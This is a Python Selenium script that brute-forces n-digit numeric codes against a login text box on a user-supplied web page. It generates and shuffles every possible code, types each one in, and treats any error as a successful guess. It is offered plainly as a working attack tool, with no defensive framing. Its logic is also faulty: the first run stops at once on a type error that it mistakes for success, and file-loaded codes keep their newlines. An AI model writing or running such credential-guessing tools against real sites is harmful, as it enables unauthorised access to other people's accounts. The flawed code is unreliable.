
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from random import shuffle
import os
from time import sleep

# getting variables
url = input("please insert the url: ")
box = input("please insert the xpath of the text box: ")
n = int(input("how many digits you want to put?\n"))
isFileExist = os.path.isfile(r"D:\python programming file\passwords" + str(n) + "digits.txt")


# setting the driver
driver = webdriver.Chrome()
driver.get(url)
sleep(2)
user = driver.find_element_by_xpath(box)

# creating the passwords list
if not isFileExist:
    pass_list = [x for x in range(0, int("9" * n)+1)]
    print("list created successfully")
    shuffle(pass_list)
    print('list shuffled successfully')
    file = open(r"D:\python programming file\passwords" + str(n) + "digits.txt", "a")
    counter = 0
    for i in pass_list:
        counter += 1
        if (counter % 10000) == 0:
            print('loading...')
        file.write(str(i).zfill(n) + "\n")

else:
    file = open(r"D:\python programming file\passwords" + str(n) + "digits.txt", "r")
    pass_list = file.readlines()


# using the list to log in
for password in pass_list:

    try:
        user.clear()
        user.send_keys(password + '\b')
        user.send_keys(Keys.RETURN)
        user = driver.find_element_by_xpath(box)
    except:
        print(password)
        break


driver.close()
